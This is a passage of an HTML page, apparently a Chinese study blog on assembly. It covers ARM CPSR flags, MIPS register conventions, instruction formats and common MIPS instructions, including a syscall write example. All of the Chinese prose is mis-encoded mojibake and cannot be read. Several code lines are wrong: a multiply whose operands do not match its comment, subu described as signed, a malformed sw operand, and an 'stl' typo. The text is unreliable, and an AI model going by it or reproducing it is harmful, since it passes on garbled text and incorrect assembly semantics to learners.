          <a href="#â‘¡æ¡ä»¶è·³è½¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡æ¡ä»¶è·³è½¬" class="headerlink" title="â‘¡æ¡ä»¶è·³è½¬"></a>â‘¡æ¡ä»¶è·³è½¬</h4>
      <p>ä¾æ®CPSRå¯„å­˜å™¨ä¸‹çš„ALUçŠ¶æ€æ ‡å¿—ä½</p>
<p>CPSRå¯„å­˜å™¨åŒ…å«ä¸‹é¢çš„ALUçŠ¶æ€æ ‡å¿—ï¼š</p>
<p>ã€€ã€€Nã€€ Set when the result of the operation was Negative(ç»“æœä¸ºè´Ÿæ•°)</p>
<p>ã€€ã€€Z    Set when the result of the operation was Zero(ç»“æœä¸º0)</p>
<p>ã€€ã€€C    Set when the operation result in a Carry(å‘ç”Ÿè¿›ä½ï¼Œæˆ–å€Ÿä½)</p>
<p>ã€€ã€€V    Set when the operation caused oVerflow(æ“ä½œé€ æˆæº¢å‡º)</p>
<p>ã€€ã€€Q    ARM architecture v5E only sticky flag</p>
<p>è¿˜æœ‰BEQã€BNE</p>

        <h1 id="ä¸‰ã€MIPS"   >
          <a href="#ä¸‰ã€MIPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€MIPS" class="headerlink" title="ä¸‰ã€MIPS"></a>ä¸‰ã€MIPS</h1>
      <p>ä¸»è¦ä»‹ç»mipselæ¶æ„çš„ï¼Œå°ç«¯åºï¼Œå¤§ç«¯çš„mipså¾ˆå°‘è€ƒåˆ°ï¼Œè€Œä¸”ä¹ŸåŸºæœ¬éƒ½æ˜¯å¤§åŒå°å¼‚</p>

        <h2 id="1-å¯„å­˜å™¨å…³ç³»-1"   >
          <a href="#1-å¯„å­˜å™¨å…³ç³»-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¯„å­˜å™¨å…³ç³»-1" class="headerlink" title="1.å¯„å­˜å™¨å…³ç³»"></a>1.å¯„å­˜å™¨å…³ç³»</h2>
      <div class="table-container"><table>
<thead>
<tr>
<th align="left">REGISTER</th>
<th align="left">NAME</th>
<th align="left">USAGE</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$0</td>
<td align="left">$zero</td>
<td align="left">å¸¸é‡0(constant value 0)</td>
</tr>
<tr>
<td align="left">$1</td>
<td align="left">$at</td>
<td align="left">ä¿ç•™ç»™æ±‡ç¼–å™¨(Reserved for assembler)</td>
</tr>
<tr>
<td align="left">$2-$3</td>
<td align="left">$v0 - $v1</td>
<td align="left">å‡½æ•°è°ƒç”¨è¿”å›å€¼(values for results and expression evaluation)</td>
</tr>
<tr>
<td align="left">$4-$7</td>
<td align="left">$a0-$a3</td>
<td align="left">å‡½æ•°è°ƒç”¨å‚æ•°(arguments)</td>
</tr>
<tr>
<td align="left">$8-$15</td>
<td align="left">$t0-$t7</td>
<td align="left">æš‚æ—¶çš„(æˆ–éšä¾¿ç”¨çš„)</td>
</tr>
<tr>
<td align="left">$16-$23</td>
<td align="left">$s0-$s7</td>
<td align="left">ä¿å­˜çš„(æˆ–å¦‚æœç”¨ï¼Œéœ€è¦SAVE/RESTOREçš„)(saved)</td>
</tr>
<tr>
<td align="left">$24-$25</td>
<td align="left">$t8-$t9</td>
<td align="left">æš‚æ—¶çš„(æˆ–éšä¾¿ç”¨çš„)</td>
</tr>
<tr>
<td align="left">$28</td>
<td align="left">$gp</td>
<td align="left">å…¨å±€æŒ‡é’ˆ(Global Pointer)</td>
</tr>
<tr>
<td align="left">$29</td>
<td align="left">$sp</td>
<td align="left">å †æ ˆæŒ‡é’ˆ(Stack Pointer)</td>
</tr>
<tr>
<td align="left">$30</td>
<td align="left">$fp</td>
<td align="left">å¸§æŒ‡é’ˆ(Frame Pointer)</td>
</tr>
</tbody></table></div>
<p>è¯´æ˜</p>
<ul>
<li>$0</li>
</ul>
<p>å³$zero,è¯¥å¯„å­˜å™¨æ€»æ˜¯è¿”å›é›¶ï¼Œä¸º0è¿™ä¸ªæœ‰ç”¨å¸¸æ•°æä¾›äº†ä¸€ä¸ªç®€æ´çš„ç¼–ç å½¢å¼ã€‚</p>
<figure class="highlight mipsasm"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">move </span>$<span class="built_in">t0</span>,$<span class="built_in">t1</span></span><br><span class="line"><span class="comment">#å®é™…ä¸º  </span></span><br><span class="line"><span class="keyword">add </span>$<span class="built_in">t0</span>,$<span class="number">0</span>,$<span class="built_in">t1</span></span><br></pre></td></tr></table></div></figure>

<p>ä½¿ç”¨ä¼ªæŒ‡ä»¤å¯ä»¥ç®€åŒ–ä»»åŠ¡ï¼Œæ±‡ç¼–ç¨‹åºæä¾›äº†æ¯”ç¡¬ä»¶æ›´ä¸°å¯Œçš„æŒ‡ä»¤é›†ã€‚</p>
<ul>
<li>$1</li>
</ul>
<p>å³ $atï¼Œè¯¥å¯„å­˜å™¨ä¸ºæ±‡ç¼–ä¿ç•™ï¼Œç”±äºIå‹æŒ‡ä»¤çš„ç«‹å³æ•°å­—æ®µåªæœ‰16ä½ï¼Œåœ¨åŠ è½½å¤§å¸¸æ•°æ—¶ï¼Œç¼–è¯‘å™¨æˆ–æ±‡ç¼–ç¨‹åºéœ€è¦æŠŠå¤§å¸¸æ•°æ‹†å¼€ï¼Œç„¶åé‡æ–°ç»„åˆåˆ°å¯„å­˜å™¨é‡Œã€‚æ¯”å¦‚åŠ è½½ä¸€ä¸ª32ä½ç«‹å³æ•°éœ€è¦ <code>lui</code>ï¼ˆè£…å…¥é«˜ä½ç«‹å³æ•°ï¼‰å’Œ<code>addi</code>ä¸¤æ¡æŒ‡ä»¤ã€‚åƒMIPSç¨‹åºæ‹†æ•£å’Œé‡è£…å¤§å¸¸æ•°ç”±æ±‡ç¼–ç¨‹åºæ¥å®Œæˆï¼Œæ±‡ç¼–ç¨‹åºå¿…éœ€ä¸€ä¸ªä¸´æ—¶å¯„å­˜å™¨æ¥é‡ç»„å¤§å¸¸æ•°ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºæ±‡ç¼–ä¿ç•™$atçš„åŸå› ä¹‹ä¸€ã€‚</p>
<ul>
<li>$2..$3:($v0-$v1)</li>
</ul>
<p>ç”¨äºå­ç¨‹åºçš„éæµ®ç‚¹ç»“æœæˆ–è¿”å›å€¼ï¼Œå¯¹äºå­ç¨‹åºå¦‚ä½•ä¼ é€’å‚æ•°åŠå¦‚ä½•è¿”å›ï¼ŒMIPSèŒƒå›´æœ‰ä¸€å¥—çº¦å®šï¼Œå †æ ˆä¸­å°‘æ•°å‡ ä¸ªä½ç½®å¤„çš„å†…å®¹è£…å…¥CPUå¯„å­˜å™¨ï¼Œå…¶ç›¸åº”å†…å­˜ä½ç½®ä¿ç•™æœªåšå®šä¹‰ï¼Œå½“è¿™ä¸¤ä¸ªå¯„å­˜å™¨ä¸å¤Ÿå­˜æ”¾è¿”å›å€¼æ—¶ï¼Œç¼–è¯‘å™¨é€šè¿‡å†…å­˜æ¥å®Œæˆã€‚</p>
<ul>
<li>$4..$7:($a0-$a3)</li>
</ul>
<p>ç”¨æ¥ä¼ é€’å‰å››ä¸ªå‚æ•°ç»™å­ç¨‹åºï¼Œä¸å¤Ÿçš„ç”¨å †æ ˆã€‚a0-a3å’Œv0-v1ä»¥åŠraä¸€èµ·æ¥æ”¯æŒå­ç¨‹åºï¼è¿‡ç¨‹è°ƒç”¨ï¼Œåˆ†åˆ«ç”¨ä»¥ä¼ é€’å‚æ•°ï¼Œè¿”å›ç»“æœå’Œå­˜æ”¾è¿”å›åœ°å€ã€‚å½“éœ€è¦ä½¿ç”¨æ›´å¤šçš„å¯„å­˜å™¨æ—¶ï¼Œå°±éœ€è¦å †æ ˆï¼ˆstack)äº†,MIPSç¼–è¯‘å™¨æ€»æ˜¯ä¸ºå‚æ•°åœ¨å †æ ˆä¸­ç•™æœ‰ç©ºé—´ä»¥é˜²æœ‰å‚æ•°éœ€è¦å­˜å‚¨ã€‚</p>
<ul>
<li>$8..$15:($t0-$t7)</li>
</ul>
<p>ä¸´æ—¶å¯„å­˜å™¨ï¼Œå­ç¨‹åºå¯ä»¥ä½¿ç”¨å®ƒä»¬è€Œä¸ç”¨ä¿ç•™ã€‚</p>
<ul>
<li>$16..$23:($s0-$s7)</li>
</ul>
<p>ä¿å­˜å¯„å­˜å™¨ï¼Œåœ¨è¿‡ç¨‹è°ƒç”¨è¿‡ç¨‹ä¸­éœ€è¦ä¿ç•™ï¼ˆè¢«è°ƒç”¨è€…ä¿å­˜å’Œæ¢å¤ï¼Œè¿˜åŒ…æ‹¬$fpå’Œ$raï¼‰ï¼ŒMIPSæä¾›äº†ä¸´æ—¶å¯„å­˜å™¨å’Œä¿å­˜å¯„å­˜å™¨ï¼Œè¿™æ ·å°±å‡å°‘äº†å¯„å­˜å™¨æº¢å‡ºï¼ˆspilling,å³å°†ä¸å¸¸ç”¨çš„å˜é‡æ”¾åˆ°å­˜å‚¨å™¨çš„è¿‡ç¨‹),ç¼–è¯‘å™¨åœ¨ç¼–è¯‘ä¸€ä¸ªå¶ï¼ˆleaf)è¿‡ç¨‹ï¼ˆä¸è°ƒç”¨å…¶å®ƒè¿‡ç¨‹çš„è¿‡ç¨‹ï¼‰çš„æ—¶å€™ï¼Œæ€»æ˜¯åœ¨ä¸´æ—¶å¯„å­˜å™¨åˆ†é…å®Œäº†æ‰ä½¿ç”¨éœ€è¦ä¿å­˜çš„å¯„å­˜å™¨ã€‚</p>
<ul>
<li>$24..$25:($t8-$t9)</li>
</ul>
<p>åŒ($t0-$t7) $26..$27:($k0,$k1)ä¸ºæ“ä½œç³»ç»Ÿï¼å¼‚å¸¸å¤„ç†ä¿ç•™ï¼Œè‡³å°‘è¦é¢„ç•™ä¸€ä¸ªã€‚ å¼‚å¸¸ï¼ˆæˆ–ä¸­æ–­ï¼‰æ˜¯ä¸€ç§ä¸éœ€è¦åœ¨ç¨‹åºä¸­æ˜¾ç¤ºè°ƒç”¨çš„è¿‡ç¨‹ã€‚MIPSæœ‰ä¸ªå«å¼‚å¸¸ç¨‹åºè®¡æ•°å™¨ï¼ˆexception program counter,EPC)çš„å¯„å­˜å™¨ï¼Œå±äºCP0å¯„å­˜å™¨ï¼Œç”¨äºä¿å­˜é€ æˆå¼‚å¸¸çš„é‚£æ¡æŒ‡ä»¤çš„åœ°å€ã€‚æŸ¥çœ‹æ§åˆ¶å¯„å­˜å™¨çš„å”¯ä¸€æ–¹æ³•æ˜¯æŠŠå®ƒå¤åˆ¶åˆ°é€šç”¨å¯„å­˜å™¨é‡Œï¼ŒæŒ‡ä»¤<code>mfc0</code>(move from system control)å¯ä»¥å°†EPCä¸­çš„åœ°å€å¤åˆ¶åˆ°æŸä¸ªé€šç”¨å¯„å­˜å™¨ä¸­ï¼Œé€šè¿‡è·³è½¬è¯­å¥ï¼ˆ<code>jr</code>)ï¼Œç¨‹åºå¯ä»¥è¿”å›åˆ°é€ æˆå¼‚å¸¸çš„é‚£æ¡æŒ‡ä»¤å¤„ç»§ç»­æ‰§è¡Œã€‚MIPSç¨‹åºå‘˜éƒ½å¿…é¡»ä¿ç•™ä¸¤ä¸ªå¯„å­˜å™¨$k0å’Œ$k1ï¼Œä¾›æ“ä½œç³»ç»Ÿä½¿ç”¨ã€‚<br>å‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œè¿™ä¸¤ä¸ªå¯„å­˜å™¨çš„å€¼ä¸ä¼šè¢«æ¢å¤ï¼Œç¼–è¯‘å™¨ä¹Ÿä¸ä½¿ç”¨k0å’Œk1,å¼‚å¸¸å¤„ç†å‡½æ•°å¯ä»¥å°†è¿”å›åœ°å€æ”¾åˆ°è¿™ä¸¤ä¸ªä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œç„¶åä½¿ç”¨jrè·³è½¬åˆ°é€ æˆå¼‚å¸¸çš„æŒ‡ä»¤å¤„ç»§ç»­æ‰§è¡Œã€‚</p>
<ul>
<li>$28:($gp)</li>
</ul>
<p>ä¸ºäº†ç®€åŒ–é™æ€æ•°æ®çš„è®¿é—®ï¼ŒMIPSè½¯ä»¶ä¿ç•™äº†ä¸€ä¸ªå¯„å­˜å™¨ï¼šå…¨å±€æŒ‡é’ˆgp(global pointer,$gp)ï¼Œå…¨å±€æŒ‡é’ˆæŒ‡å‘é™æ€æ•°æ®åŒºä¸­çš„è¿è¡Œæ—¶å†³å®šçš„åœ°å€ï¼Œåœ¨å­˜å–ä½äºgpå€¼ä¸Šä¸‹32KBèŒƒå›´å†…çš„æ•°æ®æ—¶ï¼Œåªéœ€è¦ä¸€æ¡ä»¥gpä¸ºåŸºæŒ‡é’ˆçš„æŒ‡ä»¤å³å¯ã€‚åœ¨ç¼–è¯‘æ—¶ï¼Œæ•°æ®é¡»åœ¨ä»¥gpä¸ºåŸºæŒ‡é’ˆçš„64KBèŒƒå›´å†…ã€‚</p>
<ul>
<li>$29:($sp)</li>
</ul>
<p>MIPSç¡¬ä»¶å¹¶ä¸ç›´æ¥æ”¯æŒå †æ ˆï¼Œä½ å¯ä»¥æŠŠå®ƒç”¨äºåˆ«çš„ç›®çš„ï¼Œä½†ä¸ºäº†ä½¿ç”¨åˆ«äººçš„ç¨‹åºæˆ–è®©åˆ«äººä½¿ç”¨ä½ çš„ç¨‹åºï¼Œè¿˜æ˜¯è¦éµå®ˆè¿™ä¸ªçº¦å®šçš„ï¼Œä½†è¿™å’Œç¡¬ä»¶æ²¡æœ‰å…³ç³»ã€‚</p>
<ul>
<li>$30:($fp)</li>
</ul>
<p>GNU MIPS Cç¼–è¯‘å™¨ä½¿ç”¨äº†å¸§æŒ‡é’ˆ(frame pointer),è€ŒSGIçš„Cç¼–è¯‘å™¨æ²¡æœ‰ä½¿ç”¨ï¼Œè€ŒæŠŠè¿™ä¸ªå¯„å­˜å™¨å½“ä½œä¿å­˜å¯„å­˜å™¨ä½¿ç”¨ï¼ˆ$s8),è¿™èŠ‚çœäº†è°ƒç”¨å’Œè¿”å›å¼€é”€ï¼Œä½†å¢åŠ äº†ä»£ç ç”Ÿæˆçš„å¤æ‚æ€§ã€‚</p>
<ul>
<li>$31:($ra)</li>
</ul>
<p>å­˜æ”¾è¿”å›åœ°å€ï¼ŒMIPSæœ‰ä¸ª<code>jal</code>(jump-and-link,è·³è½¬å¹¶ é“¾æ¥)æŒ‡ä»¤ï¼Œåœ¨è·³è½¬åˆ°æŸä¸ªåœ°å€æ—¶ï¼ŒæŠŠä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€æ”¾åˆ°$raä¸­ã€‚ç”¨äºæ”¯æŒå­ç¨‹åºï¼Œä¾‹å¦‚è°ƒç”¨ç¨‹åºæŠŠå‚æ•°æ”¾åˆ°$a0~$a3,ç„¶å<code>jal X</code>è·³åˆ°Xè¿‡ç¨‹ï¼Œè¢«è°ƒè¿‡ç¨‹å®ŒæˆåæŠŠç»“æœæ”¾åˆ°$v0,$v1,ç„¶åä½¿ç”¨<code>jr $ra</code>è¿”å›ã€‚</p>

        <h2 id="2-æ±‡ç¼–æŒ‡ä»¤-1"   >
          <a href="#2-æ±‡ç¼–æŒ‡ä»¤-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ±‡ç¼–æŒ‡ä»¤-1" class="headerlink" title="2.æ±‡ç¼–æŒ‡ä»¤"></a>2.æ±‡ç¼–æŒ‡ä»¤</h2>
      
        <h3 id="1-ä¸åŒç±»å‹çš„æŒ‡ä»¤"   >
          <a href="#1-ä¸åŒç±»å‹çš„æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä¸åŒç±»å‹çš„æŒ‡ä»¤" class="headerlink" title="(1)ä¸åŒç±»å‹çš„æŒ‡ä»¤"></a>(1)ä¸åŒç±»å‹çš„æŒ‡ä»¤</h3>
      
        <h4 id="Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨"   >
          <a href="#Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨" class="headerlink" title="Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨"></a>Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨</h4>
      <p>å¸¸è§æŒ‡ä»¤ï¼š<code>add</code>, <code>sub</code>, <code>and</code>, <code>or</code>, <code>nor</code>, <code>slt</code>, <code>sll</code>, <code>srl</code>, <code>jr</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150231733.png" alt="image-20211230150231733"></p>
<ul>
<li>opcodï¼šæ“ä½œç  </li>
<li>rsï¼šæºå¯„å­˜å™¨çš„æ•°é‡ </li>
<li>rtï¼šæºå¯„å­˜å™¨çš„æ•°é‡ </li>
<li>rdï¼šç›®æ ‡å¯„å­˜å™¨çš„ç¼–å·</li>
<li>shamï¼šç§»ä½é‡ï¼ˆæ“ä½œç§»ä½çš„ä½æ•°ï¼‰</li>
<li>Func: å‡½æ•°ï¼ˆæ“ä½œç æ‰©å±•ï¼‰ </li>
</ul>
<p>Shamä»…ç”¨äºæ“ä½œåç§»é‡çš„æŒ‡ä»¤ï¼ˆä¾‹å¦‚<code>stl</code>ï¼‰</p>

        <h4 id="Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡"   >
          <a href="#Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡" class="headerlink" title="Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡"></a>Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡</h4>
      <p>å¸¸è§æŒ‡ä»¤ï¼š<code>addi</code>, <code>lw</code>, <code>sw</code>, <code>lh</code>, <code>sh</code>, <code>lb</code>, <code>lbu</code>, <code>sb</code>, <code>ll</code>, <code>sc</code>, <code>lui</code>, <code>andi</code>, <code>ori</code>, <code>beq</code>, <code>bne</code>, <code>slti</code>, <code>sltiu</code></p>
<ul>
<li>opcodï¼šæ“ä½œç </li>
<li>rsï¼šæºå¯„å­˜å™¨çš„æ•°é‡</li>
<li>rdï¼šæºæˆ–ç›®æ ‡å¯„å­˜å™¨çš„æ•°é‡</li>
<li>imd: ç«‹å³å€¼</li>
</ul>

        <h4 id="Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€"   >
          <a href="#Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€" class="headerlink" title="Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€"></a>Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€</h4>
      <p>å¤„ç†å™¨ç›´æ¥è·³è·ƒåˆ°ç»™å®šçš„åœ°å€ï¼Œæ‰§è¡Œæ‰€åœ¨åœ°å€çš„æŒ‡ä»¤</p>
<p>å¸¸è§æŒ‡ä»¤ï¼š<code>j</code>, <code>jal</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150255746.png" alt="image-20211230150255746"></p>
<ul>
<li>Opcodï¼šæ“ä½œç </li>
<li>Imdï¼šç«‹å³å€¼</li>
</ul>

        <h3 id="2-å¸¸ç”¨æŒ‡ä»¤"   >
          <a href="#2-å¸¸ç”¨æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="(2)å¸¸ç”¨æŒ‡ä»¤"></a>(2)å¸¸ç”¨æŒ‡ä»¤</h3>
      <p>å…¶ä¸­<code>i</code>è¡¨ç¤ºç«‹å³æ•°ç›¸å…³ï¼Œ<code>u</code>è¡¨ç¤ºæ— ç¬¦å·ç›¸å…³ã€‚</p>

        <h4 id="â‘ load-store-æŒ‡ä»¤"   >
          <a href="#â‘ load-store-æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ load-store-æŒ‡ä»¤" class="headerlink" title="â‘ load/store æŒ‡ä»¤"></a>â‘ load/store æŒ‡ä»¤</h4>
      
        <h5 id="la"   >
          <a href="#la" class="heading-link"><i class="fas fa-link"></i></a><a href="#la" class="headerlink" title="la"></a>la</h5>
      <p>å°†åœ°å€æˆ–è€…æ ‡ç­¾å­˜å…¥ä¸€ä¸ªå¯„å­˜å™¨ eg:<code>la $t0,val_1</code>å¤åˆ¶val_lçš„åœ°å€åˆ°$t0ä¸­ï¼Œval_1æ˜¯ä¸€ä¸ªLabel</p>

        <h5 id="li"   >
          <a href="#li" class="heading-link"><i class="fas fa-link"></i></a><a href="#li" class="headerlink" title="li"></a>li</h5>
      <p>å°†ç«‹å³æ•°å­˜å…¥é€šç”¨å¯„å­˜å™¨ eg:<code>li $t1, 40</code> $t1 = 40</p>

        <h5 id="lw"   >
          <a href="#lw" class="heading-link"><i class="fas fa-link"></i></a><a href="#lw" class="headerlink" title="lw"></a>lw</h5>
      <p>ä»æŒ‡å®šçš„åœ°å€åŠ è½½ä¸€ä¸ªwordç±»å‹çš„å€¼åˆ°ä¸€ä¸ªå¯„å­˜å™¨ eg:<code>lw $s0, 0($sp) $s0=MEM[$sp+0]</code></p>

        <h5 id="sw"   >
          <a href="#sw" class="heading-link"><i class="fas fa-link"></i></a><a href="#sw" class="headerlink" title="sw"></a>sw</h5>
      <p>å°†å¯„å­˜å™¨çš„å€¼ï¼Œå­˜äºæŒ‡å®šçš„åœ°å€wordç±»å‹ eg:<code>sw $a0, 0($sp) MEM[$sp+0] = $a0</code></p>

        <h5 id="move"   >
          <a href="#move" class="heading-link"><i class="fas fa-link"></i></a><a href="#move" class="headerlink" title="move"></a>move</h5>
      <p>å¯„å­˜å™¨ä¼ å€¼ egï¼š<code>move $t5, $t2 $t5 = $t2</code></p>

        <h4 id="â‘¡ç®—æ•°æŒ‡ä»¤"   >
          <a href="#â‘¡ç®—æ•°æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡ç®—æ•°æŒ‡ä»¤" class="headerlink" title="â‘¡ç®—æ•°æŒ‡ä»¤"></a>â‘¡ç®—æ•°æŒ‡ä»¤</h4>
      <p>ç®—æ•°æŒ‡ä»¤çš„æ‰€æœ‰æ“ä½œéƒ½æ˜¯å¯„å­˜å™¨ï¼Œä¸èƒ½æ˜¯ RAM åœ°å€æˆ–é—´æ¥å¯»å€ã€‚ä¸”æ“ä½œæ•°å¤§å°éƒ½æ˜¯ wordï¼ˆ4byteï¼‰</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add $t0, $t1, $t2;		$t0=$t1+$t2;	å¸¦ç¬¦å·æ•°ç›¸åŠ </span><br><span class="line">sub $t0, $t1, $t2;		$t0=$t1-$t2;	å¸¦ç¬¦å·æ•°ç›¸å‡</span><br><span class="line">addi $t0, $t1, 5;		$t0=$t1+5;		æœ‰ç«‹å³æ•°çš„åŠ æ³•</span><br><span class="line">addu $t0, $t1, $t2;		$t0=$t1+$t2;	æ— ç¬¦å·æ•°çš„åŠ æ³•</span><br><span class="line">subu $t0, $t1, $t2;		$t0=$t1-$t2;	å¸¦ç¬¦å·æ•°ç›¸å‡</span><br><span class="line">mult $t3, $t3;			(HI, LO) = $t3 * $t4</span><br><span class="line">div $t5, $t6;			$Hi=$t5 mod $t6</span><br><span class="line">mfhi $t0;				$t0 = $Hi</span><br><span class="line">mflo $t1;				$t1 = $Lo</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¢syscall"   >
          <a href="#â‘¢syscall" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢syscall" class="headerlink" title="â‘¢syscall"></a>â‘¢syscall</h4>
      <p>äº§ç”Ÿä¸€ä¸ªè½¯åŒ–ä¸­æ–­ï¼Œå®ç°ç³»ç»Ÿè°ƒç”¨ï¼›ç³»ç»Ÿè°ƒç”¨å·å­˜æ”¾åœ¨ $v0 ä¸­ï¼Œå‚æ•°åœ¨ $a0~$a3 ä¸­ï¼›</p>
<p>è¿”å›å€¼åœ¨ $v0 ä¸­ï¼Œå¦‚æœå‡ºé”™ï¼Œåœ¨ $a3 ä¸­è¿”å›é”™è¯¯å·ï¼›åœ¨ç¼–å†™ shellcode æ—¶ï¼Œç”¨åˆ°è¯¥æŒ‡ä»¤æœºåˆ¶</p>
<p>Write(1, â€œABCnâ€, 5) å®ç°å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">addiu $sp, $sp, -32;</span><br><span class="line">li $a0, 1;</span><br><span class="line">lui $t6, 0x4142;</span><br><span class="line">ori $t6, $t6, 0x430a;</span><br><span class="line">sw  $t6, $0($sp);</span><br><span class="line">addiu $a1, $sp, 0;</span><br><span class="line">li $a2, 5;</span><br><span class="line">li $v0, 4004;</span><br><span class="line">syscall;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤"   >
          <a href="#â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤" class="headerlink" title="â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤"></a>â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤</h4>
      <p>åˆ†æ”¯è·³è½¬æŒ‡ä»¤æœ¬èº«å¯ä»¥é€šè¿‡æ¯”è¾ƒä¸¤ä¸ªå¯„å­˜å™¨å†³å®šå¦‚ä½•è·³è½¬ï¼›å¦‚æœæƒ³è¦å®ç°ä¸ç«‹å³æ•°çš„æ¯”è¾ƒè·³è½¬ï¼Œéœ€è¦ç»“åˆç±»è·³è½¬æŒ‡ä»¤å®ç°</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b target;				æ— æ¡ä»¶è·³è½¬åˆ°targetå¤„</span><br><span class="line">beq $t0, $t1, target;	å¦‚æœ&quot;$t0 == $t1â€ï¼Œè·³è½¬åˆ°target</span><br><span class="line">blt $t0, $t1, target;	å¦‚æœâ€œ$t0 &lt; $t1â€ï¼Œè·³è½¬åˆ°target</span><br><span class="line">ble $t0, $t1, target;	å¦‚æœâ€œ$t0 &lt;= $t1â€ è·³è½¬åˆ°target</span><br><span class="line">bgt;</span><br><span class="line">blt;</span><br><span class="line">bne;					ç±»æ¯”ä¸Š</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¤è·³è½¬æŒ‡ä»¤"   >
          <a href="#â‘¤è·³è½¬æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¤è·³è½¬æŒ‡ä»¤" class="headerlink" title="â‘¤è·³è½¬æŒ‡ä»¤"></a>â‘¤è·³è½¬æŒ‡ä»¤</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">j target;			æ— æ¡ä»¶è·³è½¬target</span><br><span class="line">jr $t3;				è·³è½¬åˆ°$t3æŒ‡å‘çš„åœ°å€å¤„(Jump Register)</span><br><span class="line">jal target;			è·³è½¬åˆ°targetï¼Œå¹¶ä¿å­˜è¿”å›åœ°å€åˆ°$raä¸­</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¥å­å‡½æ•°çš„è°ƒç”¨"   >
          <a href="#â‘¥å­å‡½æ•°çš„è°ƒç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¥å­å‡½æ•°çš„è°ƒç”¨" class="headerlink" title="â‘¥å­å‡½æ•°çš„è°ƒç”¨"></a>â‘¥å­å‡½æ•°çš„è°ƒç”¨</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jal   sub_routine_label;å¤åˆ¶å½“å‰PCçš„å€¼åˆ°$raä¸­ï¼Œï¼ˆå½“å‰PCå€¼å°±æ˜¯è¿”å›åœ°å€ï¼‰ç¨‹åºè·³è½¬åˆ°sub_routine_label</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¦å­å‡½æ•°çš„è¿”å›"   >
          <a href="#â‘¦å­å‡½æ•°çš„è¿”å›" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¦å­å‡½æ•°çš„è¿”å›" class="headerlink" title="â‘¦å­å‡½æ•°çš„è¿”å›"></a>â‘¦å­å‡½æ•°çš„è¿”å›</h4>
